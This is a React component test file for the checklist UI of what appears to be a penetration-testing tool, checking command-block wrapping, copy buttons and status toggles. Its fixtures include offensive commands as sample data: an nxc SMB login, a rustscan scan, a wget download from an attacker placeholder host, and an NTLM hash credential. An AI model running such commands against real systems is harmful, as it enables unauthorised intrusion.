import { readFileSync } from "node:fs";
import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it, vi } from "vitest";
import { CommandList } from "../features/checklist/CommandList";
import { CredentialPicker } from "../features/checklist/CredentialPicker";
import { GoalRow } from "../features/checklist/GoalRow";
import type { Credential } from "../types/credentials";

// jsdom has no layout: these check the classes that decide wrapping (U5–U7).
const cred: Credential = {
  id: "c1", engagementId: "e1", type: "hash", username: "ted_admin", domain: "EXAM2.TEST", secret: "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
  hashType: "ntlm", scope: "domain", localHostId: null, sourceHostId: null, source: null, notes: null, crackStatus: null, crackedFrom: null,
  fromSecretId: null, createdAt: 1, updatedAt: 1,
};

describe("layout (U5–U7)", () => {
  it("U5: the Commands use label sits on its own line above a full-width picker that ellipsizes with a title", () => {
    render(<CredentialPicker credentials={[cred]} value={cred} onChange={() => {}} />);
    const label = screen.getByText("Commands use:");
    const picker = screen.getByRole("combobox", { name: "Commands use" });
    expect(label.parentElement).toBe(picker.parentElement);
    expect(label.parentElement).toHaveClass("credential-picker");
    expect(picker).toHaveClass("credential-picker__select");
    const scss = readFileSync("src/features/checklist/CredentialPicker.scss", "utf8");
    expect(scss).toMatch(/\.credential-picker \{\s*display: grid;/);
    expect(scss).toMatch(/\.credential-picker__select \{\s*width: 100%;/);
    expect(picker.getAttribute("title")).toContain("ted_admin");
    expect(picker.querySelector(".select-trigger__value")).not.toBeNull();
  });

  it("U6: a command block wraps at whitespace, keeps each word whole, and its text stays selectable and copyable as written", () => {
    render(<CommandList commands={[{ id: "a", title: "Run it", text: "nxc smb 10.10.67.140 -u tom", unresolved: [], msfMarker: false }]} />);
    const pre = screen.getByText((_, el) => el?.tagName === "PRE");
    // Wraps at whitespace (pre-wrap, no word breaking) and never scrolls sideways: the wrapping variant.
    expect(pre).toHaveClass("command-block__text", "command-block__text--wrap");
    expect(pre).not.toHaveClass("command-block__text--scroll");
    expect(pre.textContent).toBe("nxc smb 10.10.67.140 -u tom");
  });

  it("Copy is an icon button in the fixed right track of the CommandBlock; the description is full width above", () => {
    render(<CommandList commands={[{ id: "a", title: "A long description of what this command does on the target", text: "id", unresolved: [], msfMarker: false }]} />);
    const copy = screen.getByRole("button", { name: /Copy command: A long description/ });
    const block = screen.getByTestId("command-block");
    expect(block).toContainElement(copy);
    // A fixed 28px track for Copy, 8px from the text: the text never runs under it.
    const row = copy.parentElement!;
    expect(row).toHaveClass("command-block__box");
    expect(copy.className).not.toMatch(/absolute/);
    expect(copy.querySelector("svg")).not.toBeNull();
    const desc = screen.getByText(/A long description/);
    expect(block).not.toContainElement(desc);
    expect(desc.className).not.toMatch(/truncate/);
  });
  it("status is one segmented control: four radios in a radiogroup, exactly one on, 28px tall", () => {
    render(
      <ul>
        <GoalRow goal={{ id: "g", title: "Scan it", why: "Because." }} state={{ status: "in_progress" }} commands={[]} evidence={[]} onStatus={vi.fn()} onNotes={vi.fn()} />
      </ul>,
    );
    const group = screen.getByRole("radiogroup", { name: "Status: Scan it" });
    const segs = within(group).getAllByRole("radio");
    expect(segs.map((b) => b.textContent)).toEqual(["To do", "Doing", "Done", "N/A"]);
    expect(segs.filter((b) => b.getAttribute("aria-checked") === "true").map((b) => b.textContent)).toEqual(["Doing"]);
    // A 28px pill whose segments fill its height.
    expect(group).toHaveClass("toggle-group");
    for (const s of segs) expect(s).toHaveClass("toggle-group__item");
    const scss = readFileSync("src/ui/shadcn/toggle-group.scss", "utf8");
    expect(scss).toMatch(/\.toggle-group \{[^}]*height: 1\.75rem;[^}]*border-radius: var\(--radius-sm\);/);
    expect(scss).toMatch(/\.toggle-group__item \{[^}]*height: 100%;/);
    expect(screen.getByText("Because.").parentElement).toHaveClass("goal-row__body");
    expect(readFileSync("src/features/checklist/GoalRow.scss", "utf8")).toMatch(/\.goal-row__body \{[^}]*gap: var\(--space-md\);/);
  });

  it("pressing the selected status again keeps it", async () => {
    const onStatus = vi.fn();
    render(
      <ul>
        <GoalRow goal={{ id: "g", title: "Scan it" }} state={{ status: "done" }} commands={[]} evidence={[]} onStatus={onStatus} onNotes={vi.fn()} />
      </ul>,
    );
    await userEvent.click(screen.getByRole("radio", { name: "Done" }));
    expect(onStatus).not.toHaveBeenCalled();
    await userEvent.click(screen.getByRole("radio", { name: "N/A" }));
    expect(onStatus).toHaveBeenCalledWith("g", "na");
  });

  it("a command wraps only at spaces: each word is a nowrap token, the text and copy unchanged", () => {
    render(<CommandList commands={[{ id: "a", title: "Scan", text: "rustscan -a 10.10.20.15 -- -sC -sV", unresolved: [], msfMarker: false }]} />);
    const block = screen.getByTestId("command-block");
    const words = [...block.querySelectorAll("[data-token]")];
    expect(words.map((w) => w.textContent)).toEqual(["rustscan", "-a", "10.10.20.15", "--", "-sC", "-sV"]);
    for (const w of words) expect(w).toHaveClass("command-block__token");
    expect(block.querySelector("pre")).toHaveClass("command-block__text--wrap");
    expect(block.querySelector("pre")!.textContent).toBe("rustscan -a 10.10.20.15 -- -sC -sV");
  });

  it("unresolved tokens stay marked inside their word, even with a placeholder in the middle", () => {
    render(<CommandList commands={[{ id: "a", title: "Get", text: "wget http://{LHOST}:80/x", unresolved: ["LHOST"], tokens: ["{LHOST}"], msfMarker: false }]} />);
    const mark = screen.getByText("{LHOST}");
    expect(mark.tagName).toBe("MARK");
    expect(mark.closest("[data-token]")!.textContent).toBe("http://{LHOST}:80/x");
  });

  it("a DC picked by name is flagged on the command", () => {
    render(<CommandList commands={[{ id: "a", title: "Sync", text: "ntpdate 10.0.0.10", unresolved: [], msfMarker: false, dcByName: true }]} />);
    expect(screen.getByText("DC (by name)")).toBeInTheDocument();
  });
});
